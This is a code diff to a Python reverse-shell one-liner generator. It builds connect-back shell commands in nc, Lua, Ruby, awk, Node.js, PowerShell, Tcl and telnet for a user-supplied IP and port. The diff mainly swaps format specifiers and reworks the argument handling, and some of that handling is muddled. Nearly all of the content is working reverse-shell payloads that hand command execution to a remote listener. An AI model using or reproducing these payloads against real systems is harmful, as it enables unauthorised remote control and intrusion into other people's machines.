@@ -28,8 +28,8 @@ def onel(ip,port,long):
                    f'rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc {long} {port} 1>/tmp/l']
     ol["lua"] = [ f'lua5.1 -e \'local host,port = \"%s\",%d local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect({ip},{port}); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,\'r\') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()',
                   f'lua5.1 -e \'local host,port = \"%s\",%d local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect({long},{port}); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,\'r\') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()',
-                  'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("%s",%d);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''% (ip, port),
-                  'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("%s",%d);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' % (long, port) ]
+                  'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("%s",%s);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''% (ip, port),
+                  'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("%s",%s);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' % (long, port) ]
         
     ol["xterm"] = [f'xterm -display {ip}:1 \n# Connect to your shell with:\n# Xnest :1 or xhost +targetip' ,
                    f'xterm -display {long}:1 \n# Connect to your shell with:\n# Xnest :1 or xhost +targetip' ]
@@ -40,13 +40,13 @@ def onel(ip,port,long):
     ol["awk"] = ['awk \'BEGIN {s = "/inet/tcp/0/%s/%d"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null',
                   'awk \'BEGIN {s = "/inet/tcp/0/%s/%d"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null']
        
-    ol["nodejs"] = ['(function()\{ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(%s, "%d", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();' % (ip, port),
-                   '(function()\{ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(%s, "%d", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();' % (long, port)]
-    ol["psh"] =  ['$client = New-Object System.Net.Sockets.TCPClient(\'%s\',%d); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {\\; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \'; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();'  % (ip, port),
-                  '$client = New-Object System.Net.Sockets.TCPClient(\'%s\',%d); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {\\; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \'; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();'  % (ip, port)]
+    ol["nodejs"] = ['(function()\{ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(%s, "%s", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();' % (ip, port),
+                   '(function()\{ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(%s, "%s", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();' % (long, port)]
+    ol["psh"] =  ['$client = New-Object System.Net.Sockets.TCPClient(\'%s\',%s); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {\\; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \'; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();'  % (ip, port),
+                  '$client = New-Object System.Net.Sockets.TCPClient(\'%s\',%s); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {\\; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \'; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();'  % (ip, port)]
         
-    ol["tclsh"] =  ['echo \'set s [socket %s %d];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | tclsh' % (ip, port),
-                   'echo \'set s [socket %s %d];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | tclsh' % (long, port),]
+    ol["tclsh"] =  ['echo \'set s [socket %s %s];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | tclsh' % (ip, port),
+                   'echo \'set s [socket %s %s];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | tclsh' % (long, port),]
 
     ol["telnet"]= [f'telnet LHOST LPORT | /bin/bash | telnet {ip} {port}',
                    f'telnet LHOST LPORT | /bin/bash | telnet {ip} {port}',
@@ -63,7 +63,7 @@ def onel(ip,port,long):
 
 ##########################
 ##########################
-def rev(ip,port,w='all'):
+def rev(ip,port,w):
 
     long = int(ipaddress.IPv4Address(ip))
     onel(ip,port,long)
@@ -91,6 +91,8 @@ def chk_port(port=""):
             port = chk_port(port)
         except AssertionError:
             print('It\'s not a valid port number, sorry! try again')
+            port= input("PORT: ")
+            port = chk_port(port)
         return port
     chk=True
     return port
@@ -150,12 +152,28 @@ if __name__ == "__main__":
     except AttributeError:
         ip = chk_ip(ip)
         port = chk_port()
-        if args.w is None or args.w=="":
+        if (args.w == None) or args.w=="":
             w = args.w
             w=chk_type(w)
-        else:
-            w="all"
+       # else:
+      #     w="all"
+            rev(ip,port,w)
+    
+    
+    ## -w TYPE only
+    if args.w and (args.ip == None) or (args.ip==""):
+        w = chk_type(args.w)
+        #w = args.w
+        print(w)
+        if ipa == False :
+            ip = chk_ip(ip)
+            rev(ip,port,w)
+        port = chk_port(port)
+        
         rev(ip,port,w)
+ 
+
+    
     ## -ip IP:PORT
     if (args.ip) and (args.w == None):
         if ipa == False :
